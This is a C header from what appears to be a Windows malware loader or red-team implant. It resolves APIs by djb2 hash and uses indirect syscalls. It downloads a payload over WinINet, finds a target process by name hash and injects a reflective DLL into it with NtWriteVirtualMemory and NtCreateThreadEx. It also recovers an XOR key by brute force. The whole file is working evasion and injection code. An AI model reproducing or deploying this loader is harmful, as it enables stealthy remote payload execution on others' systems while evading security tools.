# pragma once
# include "hashycalls.h"
# include "hellshall.h"

# define DEBUG

# ifdef DEBUG
# include <stdio.h>
# define __FILENAME__	(strrchr(__FILE__, '\\') + 1)
# define dbg(msg, ...)	printf("[ DEBUG ] | %s:%s:%d -> "  msg "\n", __FILENAME__, __func__, __LINE__, ##__VA_ARGS__);
# define wait() 		getchar();
# endif

# ifndef DEBUG
# define dbg(msg)	do {} while (0)
# define wait()		do {} while (0)
# endif 

# define INTERNET_FLAG_NO_CACHE_WRITE				0x04000000
# define INTERNET_FLAG_HYPERLINK 					0x00000400
# define INTERNET_FLAG_IGNORE_CERT_DATE_INVALID		0x00002000

# define REFLECTIVE_FUNCTION_HASH 					0x588F4FA5
# define CHUNK_SIZE 								1024


DWORD Djb2(IN PWCHAR String) {
	ULONG Hash = 3281;
	INT c = 0;

	while (c = *String++)
		Hash = ((Hash << 5) + Hash) + c;

	return Hash;
}

DWORD Djb2A(IN PCHAR String) {
	ULONG Hash = 3281;
	INT c = 0;

	while (c = *String++)
		Hash = ((Hash << 5) + Hash) + c;

	return Hash;
}

HANDLE GetProcessHandle(IN DWORD Hash) {
	HANDLE				hProcess	= 0,
						hSnapshot	= 0;
	WCHAR				LowerCaseProcName[MAX_PATH * sizeof(WCHAR)] = { 0 };
	SIZE_T				SizeOfName 	= 0;
	PROCESSENTRY32 		Process 	= { .dwSize = sizeof(PROCESSENTRY32) };
	CLIENT_ID 			ClId 		= { 0 };
	OBJECT_ATTRIBUTES	ObjAttr 	= { 0 };
	NTSTATUS 			Status 		= 0;

	GET_FUNCTION_CALL(CreateToolhelp32Snapshot);
	GET_FUNCTION_CALL(Process32FirstW);
	GET_FUNCTION_CALL(Process32NextW);

	if (!(hSnapshot = CreateToolhelp32Snapshot_(0x00000002, 0)))
		return NULL;

	if (!(Process32FirstW_(hSnapshot, &Process)))
		return NULL;

	do {
		if (Process.th32ProcessID && Process.szExeFile) {
			if (Djb2(Process.szExeFile) == Hash) {

				ClId.UniqueProcess = (HANDLE)(ULONG_PTR)Process.th32ProcessID;
				ClId.UniqueThread = 0;
				InitializeObjectAttributes(&ObjAttr, NULL, 0, NULL, NULL);
				if ((Status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjAttr, &ClId)) == 0x0) {
					dbg("Acquired handle to target process %S (%d)", Process.szExeFile, Process.th32ProcessID);
					return hProcess;
				}
				else {
					dbg("Could not open a handle to %S (%d). Error code: 0x%0.8X", Process.szExeFile, Process.th32ProcessID, Status);
				}
				break;
			}
		}

	} while (Process32NextW_(hSnapshot, &Process));

	return NULL;
}

PBYTE DownloadData(IN PCHAR Url, OUT DWORD* pSize) {
	GET_FUNCTION_CALL(InternetReadFile);
	GET_FUNCTION_CALL(InternetOpenA);
	GET_FUNCTION_CALL(InternetOpenUrlA);
	GET_FUNCTION_CALL(LocalAlloc);
	GET_FUNCTION_CALL(LocalReAlloc);

	HINTERNET hInternet = InternetOpenA_(0, 0, 0, 0, 0);
	if (hInternet) {
		HINTERNET hUrl = InternetOpenUrlA_(hInternet, (LPCTSTR)Url, 0, 0, INTERNET_FLAG_NO_CACHE_WRITE, 0);
		if (hUrl) {
			PBYTE pData = (PBYTE)LocalAlloc_(LPTR, CHUNK_SIZE);
			PBYTE pTemp = (PBYTE)LocalAlloc_(LPTR, CHUNK_SIZE);
			if (!pData || !pTemp) {
				return NULL;
			}

			DWORD BytesRead = 0;
			SIZE_T DataSize = 0;
			while (TRUE) {
				if (!InternetReadFile_(hUrl, pTemp, CHUNK_SIZE, &BytesRead)) {
					dbg("Failed to read data from %s", Url);
					return NULL;
				}

				DataSize += BytesRead;
				if (DataSize != 0 && DataSize != CHUNK_SIZE)
					pData = LocalReAlloc_(pData, DataSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

				memcpy((PVOID)(pData + (DataSize - BytesRead)), pTemp, BytesRead);
				memset(pTemp, '\0', BytesRead);

				if (BytesRead < CHUNK_SIZE) {
					*pSize = (DWORD)DataSize;
					return pData;
				}

			}
		}
		else {
			dbg("Could not open a handle to %s", Url);
		}
	}
	else {
		dbg("Could not initialize the wininet functions.");
	}
	return NULL;
}

DWORD RvaToOffset(DWORD RVA, PBYTE BaseAddress) {
	PIMAGE_DOS_HEADER Dos	= (PIMAGE_DOS_HEADER)BaseAddress;
	PIMAGE_NT_HEADERS Nt	= (PIMAGE_NT_HEADERS)((ULONG_PTR)BaseAddress + Dos->e_lfanew);

	if (Nt->Signature != IMAGE_NT_SIGNATURE)
		return 0;

	PIMAGE_SECTION_HEADER ImageSectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)&Nt->OptionalHeader + Nt->FileHeader.SizeOfOptionalHeader);
	for (int i = 0; i < Nt->FileHeader.NumberOfSections; i++) {
		if (RVA >= ImageSectionHeader[i].VirtualAddress && RVA < (ImageSectionHeader[i].VirtualAddress + ImageSectionHeader[i].Misc.VirtualSize)) {
			return (RVA - ImageSectionHeader[i].VirtualAddress) + ImageSectionHeader[i].PointerToRawData;
		}
	}
	dbg("Could not calculate 0x%0.8X to a file offset.", RVA);
	return 0;
}

BOOL InjectDll(IN DWORD TargetProcessHash, IN PBYTE DllBuffer, IN SIZE_T DllSize) {

	DWORD 				ReflectiveFunctionOffset 	= 0;
	ULONG 				OldProtection 				= 0;
	NTSTATUS 			Status 						= 0;
	PIMAGE_DOS_HEADER	Dos 						= (PIMAGE_DOS_HEADER)((ULONG_PTR)DllBuffer);
	PIMAGE_NT_HEADERS	Nt 							= (PIMAGE_NT_HEADERS)((ULONG_PTR)DllBuffer + Dos->e_lfanew);
	PBYTE 				pRemoteMemoryBaseAddr 		= 0;
	//OBJECT_ATTRIBUTES 	ObjAttr 					= { 0 };
	HANDLE 				hThread 					= 0,
						hProcess 					= 0;
	SIZE_T 				BytesWritten 				= 0;

	if (Nt->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	PIMAGE_EXPORT_DIRECTORY ImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(DllBuffer + RvaToOffset(Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, DllBuffer));
	PDWORD FunctionNameArray = (PDWORD)(DllBuffer + RvaToOffset(ImageExportDirectory->AddressOfNames, DllBuffer));
	PDWORD FunctionAddressArray = (PDWORD)(DllBuffer + RvaToOffset(ImageExportDirectory->AddressOfFunctions, DllBuffer));
	PWORD FunctionOrdinalArray = (PWORD)(DllBuffer + RvaToOffset(ImageExportDirectory->AddressOfNameOrdinals, DllBuffer));

	for (unsigned int i = 0; i < ImageExportDirectory->NumberOfFunctions; i++) {
		PCHAR FunctionName = (PCHAR)(DllBuffer + RvaToOffset(FunctionNameArray[i], DllBuffer));
		dbg("Reflective function hash: 0x%0.8X", Djb2A(FunctionName));
		if (Djb2A(FunctionName) == REFLECTIVE_FUNCTION_HASH) {
			ReflectiveFunctionOffset = RvaToOffset(FunctionAddressArray[FunctionOrdinalArray[i]], DllBuffer);
			break;
		}
	}

	if (ReflectiveFunctionOffset == 0) {
		dbg("Could not get an offset to the reflective function");
		return FALSE;
	}


	if ((hProcess = GetProcessHandle(TargetProcessHash)) != NULL) {
		if ((Status = NtAllocateVirtualMemory(hProcess, &pRemoteMemoryBaseAddr, 0, &DllSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) == 0x0) && pRemoteMemoryBaseAddr != 0) {
			if ((Status = NtWriteVirtualMemory(hProcess, pRemoteMemoryBaseAddr, DllBuffer, (SIZE_T)DllSize, &BytesWritten)) == 0 && DllSize == BytesWritten) {
				dbg("Wrote dll to %p in the target process.", pRemoteMemoryBaseAddr);
				dbg("Reflective function begins at %p. Press enter to execute.", (pRemoteMemoryBaseAddr + ReflectiveFunctionOffset));
				wait();
				if ((Status = NtProtectVirtualMemory(hProcess, &pRemoteMemoryBaseAddr, &DllSize, PAGE_EXECUTE_READ, &OldProtection)) == 0x0) {
					if ((Status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, 0, hProcess, (LPTHREAD_START_ROUTINE)(pRemoteMemoryBaseAddr + ReflectiveFunctionOffset), 0, 0, 0, 0, 0, 0)) == 0x0) {
						dbg("Started a new thread in the process pointing at 0x%p", (pRemoteMemoryBaseAddr + ReflectiveFunctionOffset));
						return TRUE;
					}
					dbg("Could not create a remote thread. Error code: 0x%0.8X", Status);
				}
				else {
					dbg("Could not set memory protections on remote process. Error code: 0x%0.8X", Status);
				}
			}
			else {
				dbg("Failed to write reflective dll to target process. Error code: 0x%0.8X. Dll Size: %zu, Bytes Written: %zu", Status, DllSize, BytesWritten);
			}
		}
		else {
			dbg("Could not allocate memory in the target process. Error code: 0x%0.8X", Status);
		}
	}
	else {
		dbg("Could not get a handle to the target process.");
	}
	return FALSE;
}

VOID Xor(PBYTE pData, SIZE_T SizeOfData, PBYTE pKey, SIZE_T SizeOfKey) {
	for (int i = 0, j = 0; i < SizeOfData; i++, j++) {
		if (j >= SizeOfKey) {
			j = 0;
		}
		pData[i] = pData[i] ^ pKey[j];
	}
}

PBYTE DecryptKey(BYTE HintByte, PBYTE EncryptedKey, SIZE_T KeySize) {
	BYTE		KeyByte 		= 0;
	NTSTATUS	Status 			= 0;
	SIZE_T		_KeySize 		= KeySize;
	PBYTE		OriginalKey		= 0;

	if ((Status = NtAllocateVirtualMemory((HANDLE)-1, &OriginalKey, 0, &_KeySize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x0)
		return NULL;

	while (TRUE) { if (((EncryptedKey[0] ^ KeyByte) - 0) == HintByte) { break; } else { KeyByte++; } }
	for (int i = 0; i < KeySize; i++) {
		OriginalKey[i] = (BYTE)((EncryptedKey[i] ^ KeyByte) - i);
	}
	return OriginalKey;
}